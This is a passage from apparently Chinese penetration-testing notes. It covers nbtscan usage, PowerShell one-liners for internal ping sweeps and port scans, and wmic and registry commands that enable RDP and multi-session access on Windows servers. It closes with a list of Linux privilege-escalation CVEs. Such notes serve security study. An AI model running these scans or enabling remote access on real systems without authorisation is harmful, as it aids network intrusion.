    <span class="token operator">-</span>r use local port <span class="token number">137</span> <span class="token keyword">for</span> scans<span class="token punctuation">.</span> Win95 boxes respond to this only<span class="token punctuation">.</span>You need to be root to use this option on Unix<span class="token punctuation">.</span>
    <span class="token operator">-</span>q Suppress banners and error messages<span class="token punctuation">,</span>
    <span class="token operator">-</span>s separator Script<span class="token operator">-</span>friendly output<span class="token punctuation">.</span> Don't print column and record headers<span class="token punctuation">,</span> separate fields with separator<span class="token punctuation">.</span>
    <span class="token operator">-</span>h Print human<span class="token operator">-</span>readable names <span class="token keyword">for</span> services<span class="token punctuation">.</span> Can only be used with <span class="token operator">-</span>v option<span class="token punctuation">.</span>
    <span class="token operator">-</span>m retransmits Number of retransmits<span class="token punctuation">.</span> Default <span class="token number">0.</span>
    <span class="token operator">-</span>f filename Take IP addresses to scan from file filename<span class="token punctuation">.</span>
    <span class="token operator">-</span>f <span class="token operator">-</span> makes nbtscan take IP addresses from <span class="token constant">stdin</span><span class="token punctuation">.</span>
    <span class="token operator">&lt;</span>scan_range<span class="token operator">&gt;</span> what to scan<span class="token punctuation">.</span> Can either be single IP 
        like <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> or
        range of addresses in one of two forms<span class="token punctuation">:</span>
        xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token operator">/</span>xx or xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token operator">-</span>xxx<span class="token punctuation">.</span>

Examples<span class="token punctuation">:</span>
    nbtscan <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
        Scans the whole C<span class="token operator">-</span>class network<span class="token punctuation">.</span>
    nbtscan <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.25</span><span class="token operator">-</span><span class="token number">137</span>
        Scans a range from <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.25</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.137</span>
    nbtscan <span class="token operator">-</span>v <span class="token operator">-</span>s <span class="token punctuation">:</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
        Scans C<span class="token operator">-</span>class network<span class="token punctuation">.</span> Prints results in script<span class="token operator">-</span>friendly
        format using colon as field separator<span class="token punctuation">.</span>  
        Produces output like that<span class="token punctuation">:</span>
        <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span>NT_SERVER<span class="token punctuation">:</span><span class="token number">00U</span>
        <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span>MY_DOMAIN<span class="token punctuation">:</span><span class="token number">00</span>G
        <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span>ADMINISTRATOR<span class="token punctuation">:</span><span class="token number">03U</span>
        <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.2</span><span class="token punctuation">:</span>OTHER_BOX<span class="token punctuation">:</span><span class="token number">00U</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    nbtscan <span class="token operator">-</span>f iplist
        Scans IP addresses specified in file iplist<span class="token punctuation">.</span>
</code></pre>
<p><strong>NBTscan version 1.5.1:</strong></p>
<p>项目地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>scallywag<span class="token operator">/</span>nbtscan
</code></pre>
<hr>
<h2><a id="55_powershelldayuEighteenth_Day_3313"></a>5.5 powershell一条命令行进行内网扫描（dayu-Eighteenth Day）</h2>
<p><strong>检测系统类型</strong></p>
<pre><code class="prism language-c"><span class="token number">44</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span> $a <span class="token operator">=</span> $_<span class="token punctuation">;</span> <span class="token number">128.</span><span class="token number">.140</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span> $b <span class="token operator">=</span> $_<span class="token punctuation">;</span> ping <span class="token operator">-</span>n <span class="token number">1</span> <span class="token operator">-</span>w <span class="token number">10</span> <span class="token string">"192.168.$a.$b"</span> <span class="token operator">|</span> select<span class="token operator">-</span>string TTL <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>$_ <span class="token operator">-</span>match <span class="token string">"ms"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>$ttl <span class="token operator">=</span> $_<span class="token punctuation">.</span>line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span>as <span class="token punctuation">[</span><span class="token keyword">int</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>$ttl <span class="token operator">-</span>lt <span class="token number">65</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> $os <span class="token operator">=</span> <span class="token string">"Linux"</span> <span class="token punctuation">}</span> ElseIf <span class="token punctuation">(</span>$ttl <span class="token operator">-</span>gt <span class="token number">64</span> <span class="token operator">-</span>And $ttl <span class="token operator">-</span>lt <span class="token number">129</span><span class="token punctuation">)</span><span class="token punctuation">{</span> $os <span class="token operator">=</span> <span class="token string">"Windows"</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> $os <span class="token operator">=</span> <span class="token string">"Cisco"</span><span class="token punctuation">}</span><span class="token punctuation">;</span> write<span class="token operator">-</span>host <span class="token string">"192.168.$a.$b Os: $os"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token punctuation">}</span>
</code></pre>
<p><strong>ping扫描</strong><br>
1、单线程扫描</p>
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token number">.255</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span>echo <span class="token string">"192.168.44.$_"</span><span class="token punctuation">;</span> ping <span class="token operator">-</span>n <span class="token number">1</span> <span class="token operator">-</span>w <span class="token number">100</span> <span class="token number">192.168</span><span class="token number">.44</span><span class="token punctuation">.</span>$_<span class="token punctuation">}</span> <span class="token operator">|</span> Select<span class="token operator">-</span>String  ttl
</code></pre>
<p>2、并行扫描</p>
<pre><code class="prism language-c">workflow ParallelSweep <span class="token punctuation">{</span> foreach <span class="token operator">-</span>parallel <span class="token operator">-</span>throttlelimit <span class="token number">4</span> <span class="token punctuation">(</span>$i in <span class="token number">1.</span><span class="token number">.255</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>ping <span class="token operator">-</span>n <span class="token number">1</span> <span class="token operator">-</span>w <span class="token number">100</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span>$i<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span> ParallelSweep <span class="token operator">|</span> Select<span class="token operator">-</span>String ttl
</code></pre>
<p>-throttlelimit 4-4 并行线程数目</p>
<p><strong>端口扫描</strong></p>
<p>1、单线程扫描 192.168.44.133 的1-1024端口</p>
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token number">.1024</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span>echo <span class="token punctuation">(</span><span class="token punctuation">(</span>new<span class="token operator">-</span>object Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token string">"192.168.44.133"</span><span class="token punctuation">,</span>$_<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">"Port $_ is open!"</span><span class="token punctuation">}</span> <span class="token number">2</span><span class="token operator">&gt;</span>$null
</code></pre>
<p>2、扫描指定端口的所有|P</p>
<pre><code class="prism language-c">foreach <span class="token punctuation">(</span>$ip in <span class="token number">132.</span><span class="token number">.254</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>Test<span class="token operator">-</span>NetConnection <span class="token operator">-</span>Port <span class="token number">80</span> <span class="token operator">-</span>InformationLevel <span class="token string">"Detailed"</span> <span class="token number">192.168</span><span class="token number">.44</span><span class="token punctuation">.</span>$ip<span class="token punctuation">}</span>
</code></pre>
<p>3、自定义P范围和端口范围</p>
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token number">.20</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span> $a <span class="token operator">=</span> $_<span class="token punctuation">;</span> <span class="token number">1.</span><span class="token number">.1024</span> <span class="token operator">|</span> <span class="token operator">%</span> <span class="token punctuation">{</span>echo <span class="token punctuation">(</span><span class="token punctuation">(</span>new<span class="token operator">-</span>object Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span> TcpClient<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token string">"192.168.1.$a"</span><span class="token punctuation">,</span>$_<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token string">"Port $_ is open!"</span><span class="token punctuation">}</span> <span class="token number">2</span><span class="token operator">&gt;</span>$null<span class="token punctuation">}</span>
</code></pre>
<hr>
<h2><a id="56__3351"></a>5.6 内网信息收集之内网代理</h2>
<p><strong>查询代理配置情况</strong></p>
<pre><code class="prism language-c">reg query <span class="token string">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</span>
</code></pre>
<p><strong>查询并开启远程连接服务</strong><br>
查看远程连接端口</p>
<pre><code class="prism language-c">Reg query <span class="token string">"hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp"</span> <span class="token operator">/</span>v portnumber
</code></pre>
<p>在Windows Server 2003中开启3389端口</p>
<pre><code class="prism language-c">wmic path win32_terminalservicesetting where <span class="token punctuation">(</span>__CLASS <span class="token operator">!=</span><span class="token string">""</span><span class="token punctuation">)</span>  call setallowtsconnections <span class="token number">1</span>
</code></pre>
<p>在Windows Server 2008和Windows Server 2012中开启3389端口</p>
<pre><code class="prism language-c">wmic <span class="token operator">/</span>namespace<span class="token punctuation">:</span>\\root\cimv2\terminalservices path win32_terminalservicesetting where <span class="token punctuation">(</span>__CLASS <span class="token operator">!=</span><span class="token string">""</span><span class="token punctuation">)</span> call setallowtsconnections <span class="token number">1</span>

wmic <span class="token operator">/</span>namespace<span class="token punctuation">:</span>\\root\cimv2\terminalservices path win32_tsgeneralsetting where <span class="token punctuation">(</span>TerminalName<span class="token operator">=</span><span class="token string">'RDP-Tcp'</span><span class="token punctuation">)</span> call setuserauthenticationrequired <span class="token number">1</span>

reg add <span class="token string">"HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER"</span> <span class="token operator">/</span>v fSingleSessionPerUser <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d <span class="token number">0</span> <span class="token operator">/</span>f
</code></pre>
<p>书上介绍了IE代理，和PAC代理查询方法！！！</p>
<hr>
<h1><a id="_3382"></a>六、权限提升</h1>
<h2><a id="61__3383"></a>6.1 操作系统提权</h2>
<h2><a id="611_Linux_3384"></a>6.1.1 Linux</h2>
<h2><a id="6111_Linuxexp_3385"></a>6.1.1.1 Linux提权-依赖exp</h2>
<p><strong>exp注：</strong></p>
<pre><code class="prism language-c">CVE<span class="token operator">-</span><span class="token number">2017</span><span class="token operator">-</span><span class="token number">1000367</span> <span class="token punctuation">[</span>Sudo<span class="token punctuation">]</span> <span class="token punctuation">(</span>Sudo <span class="token number">1.8</span><span class="token number">.6</span>p7 <span class="token operator">-</span> <span class="token number">1.8</span><span class="token number">.20</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2017</span><span class="token operator">-</span><span class="token number">1000112</span> <span class="token punctuation">[</span>a memory corruption due to UFO to non<span class="token operator">-</span>UFO path <span class="token keyword">switch</span><span class="token punctuation">]</span>
CVE<span class="token operator">-</span><span class="token number">2017</span><span class="token operator">-</span><span class="token number">7494</span> <span class="token punctuation">[</span>Samba Remote execution<span class="token punctuation">]</span> <span class="token punctuation">(</span>Samba <span class="token number">3.5</span><span class="token number">.0</span><span class="token operator">-</span><span class="token number">4.6</span><span class="token number">.4</span><span class="token operator">/</span><span class="token number">4.5</span><span class="token number">.10</span><span class="token operator">/</span><span class="token number">4.4</span><span class="token number">.14</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2017</span><span class="token operator">-</span><span class="token number">7308</span> <span class="token punctuation">[</span>a signedness issue in AF_PACKET sockets<span class="token punctuation">]</span> <span class="token punctuation">(</span>Linux kernel through <span class="token number">4.10</span><span class="token number">.6</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2017</span><span class="token operator">-</span><span class="token number">6074</span> <span class="token punctuation">[</span>a <span class="token keyword">double</span><span class="token operator">-</span>free in DCCP protocol<span class="token punctuation">]</span> <span class="token punctuation">(</span>Linux kernel through <span class="token number">4.9</span><span class="token number">.11</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2017</span><span class="token operator">-</span><span class="token number">5123</span> <span class="token punctuation">[</span><span class="token string">'waitid()'</span><span class="token punctuation">]</span> <span class="token punctuation">(</span>Kernel <span class="token number">4.14</span><span class="token number">.0</span><span class="token operator">-</span>rc4<span class="token operator">+</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2016</span><span class="token operator">-</span><span class="token number">9793</span> <span class="token punctuation">[</span>a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options<span class="token punctuation">]</span>  <span class="token punctuation">(</span>Linux kernel before <span class="token number">4.8</span><span class="token number">.14</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2016</span><span class="token operator">-</span><span class="token number">5195</span> <span class="token punctuation">[</span>Dirty cow<span class="token punctuation">]</span> <span class="token punctuation">(</span>Linux kernel<span class="token operator">&gt;</span><span class="token number">2.6</span><span class="token number">.22</span> <span class="token punctuation">(</span>released in <span class="token number">2007</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2016</span><span class="token operator">-</span><span class="token number">2384</span> <span class="token punctuation">[</span>a <span class="token keyword">double</span><span class="token operator">-</span>free in USB MIDI driver<span class="token punctuation">]</span>  <span class="token punctuation">(</span>Linux kernel before <span class="token number">4.5</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2016</span><span class="token operator">-</span><span class="token number">0728</span> <span class="token punctuation">[</span>pp_key<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">3.8</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">3.9</span><span class="token punctuation">,</span> <span class="token number">3.10</span><span class="token punctuation">,</span> <span class="token number">3.11</span><span class="token punctuation">,</span> <span class="token number">3.12</span><span class="token punctuation">,</span> <span class="token number">3.13</span><span class="token punctuation">,</span><span class="token number">3.4</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.5</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.6</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.7</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">3.9</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.9</span><span class="token number">.6</span><span class="token punctuation">,</span><span class="token number">3.10</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.10</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.11</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.12</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.13</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.13</span><span class="token number">.1</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2015</span><span class="token operator">-</span><span class="token number">7547</span> <span class="token punctuation">[</span>glibc getaddrinfo<span class="token punctuation">]</span> <span class="token punctuation">(</span>before Glibc <span class="token number">2.9</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2015</span><span class="token operator">-</span><span class="token number">1328</span> <span class="token punctuation">[</span>overlayfs<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">3.13</span><span class="token punctuation">,</span> <span class="token number">3.16</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.19</span><span class="token number">.0</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2014</span><span class="token operator">-</span><span class="token number">5284</span> <span class="token punctuation">[</span>OSSEC<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.8</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2014</span><span class="token operator">-</span><span class="token number">4699</span> <span class="token punctuation">[</span>ptrace<span class="token punctuation">]</span> <span class="token punctuation">(</span>before <span class="token number">3.15</span><span class="token number">.4</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2014</span><span class="token operator">-</span><span class="token number">4014</span> <span class="token punctuation">[</span>Local Privilege Escalation<span class="token punctuation">]</span> <span class="token punctuation">(</span>before <span class="token number">3.14</span><span class="token number">.8</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2014</span><span class="token operator">-</span><span class="token number">3153</span> <span class="token punctuation">[</span>futex<span class="token punctuation">]</span>  <span class="token punctuation">(</span><span class="token number">3.3</span><span class="token number">.5</span> <span class="token punctuation">,</span><span class="token number">3.3</span><span class="token number">.4</span> <span class="token punctuation">,</span><span class="token number">3.3</span><span class="token number">.2</span> <span class="token punctuation">,</span><span class="token number">3.2</span><span class="token number">.13</span> <span class="token punctuation">,</span><span class="token number">3.2</span><span class="token number">.9</span> <span class="token punctuation">,</span><span class="token number">3.2</span><span class="token number">.1</span> <span class="token punctuation">,</span><span class="token number">3.1</span><span class="token number">.8</span> <span class="token punctuation">,</span><span class="token number">3.0</span><span class="token number">.5</span> <span class="token punctuation">,</span><span class="token number">3.0</span><span class="token number">.4</span> <span class="token punctuation">,</span><span class="token number">3.0</span><span class="token number">.2</span> <span class="token punctuation">,</span><span class="token number">3.0</span><span class="token number">.1</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.39</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.38</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.37</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.35</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.34</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.33</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.32</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.9</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.7</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.6</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.5</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.4</span> <span class="token punctuation">,</span><span class="token number">3.2</span><span class="token number">.2</span> <span class="token punctuation">,</span><span class="token number">3.0</span><span class="token number">.18</span> <span class="token punctuation">,</span><span class="token number">3.0</span> <span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.8</span><span class="token number">.1</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2014</span><span class="token operator">-</span><span class="token number">0196</span> <span class="token punctuation">[</span>rawmodePTY<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.36</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.37</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.38</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.39</span><span class="token punctuation">,</span> <span class="token number">3.14</span><span class="token punctuation">,</span> <span class="token number">3.15</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2014</span><span class="token operator">-</span><span class="token number">0038</span> <span class="token punctuation">[</span>timeoutpwn<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">3.4</span><span class="token punctuation">,</span> <span class="token number">3.5</span><span class="token punctuation">,</span> <span class="token number">3.6</span><span class="token punctuation">,</span> <span class="token number">3.7</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">3.9</span><span class="token punctuation">,</span> <span class="token number">3.10</span><span class="token punctuation">,</span> <span class="token number">3.11</span><span class="token punctuation">,</span> <span class="token number">3.12</span><span class="token punctuation">,</span> <span class="token number">3.13</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.5</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.6</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.7</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">3.9</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.9</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.10</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.10</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.11</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.12</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.13</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.13</span><span class="token number">.1</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2013</span><span class="token operator">-</span><span class="token number">2094</span> <span class="token punctuation">[</span>perf_swevent<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">3.0</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.1</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.2</span><span class="token punctuation">,</span> <span class="token number">3.3</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token number">.4</span><span class="token punctuation">,</span><span class="token number">3.4</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">3.5</span><span class="token punctuation">,</span> <span class="token number">3.6</span><span class="token punctuation">,</span> <span class="token number">3.7</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.3</span><span class="token punctuation">,</span><span class="token number">3.8</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">3.8</span><span class="token number">.9</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2013</span><span class="token operator">-</span><span class="token number">1858</span> <span class="token punctuation">[</span>clown<span class="token operator">-</span>newuser<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">3.3</span><span class="token operator">-</span><span class="token number">3.8</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2013</span><span class="token operator">-</span><span class="token number">1763</span> <span class="token punctuation">[</span>__sock_diag_rcv_msg<span class="token punctuation">]</span> <span class="token punctuation">(</span>before <span class="token number">3.8</span><span class="token number">.3</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2013</span><span class="token operator">-</span><span class="token number">0268</span> <span class="token punctuation">[</span>msr<span class="token punctuation">]</span>  <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.36</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.37</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.38</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.39</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.0</span><span class="token punctuation">,</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.1</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.2</span><span class="token punctuation">,</span> <span class="token number">3.3</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token punctuation">,</span> <span class="token number">3.5</span><span class="token punctuation">,</span> <span class="token number">3.6</span><span class="token punctuation">,</span> <span class="token number">3.7</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.7</span><span class="token number">.6</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2012</span><span class="token operator">-</span><span class="token number">3524</span> <span class="token punctuation">[</span>libdbus<span class="token punctuation">]</span> <span class="token punctuation">(</span>libdbus <span class="token number">1.5</span><span class="token punctuation">.</span>x and earlier<span class="token punctuation">)</span>
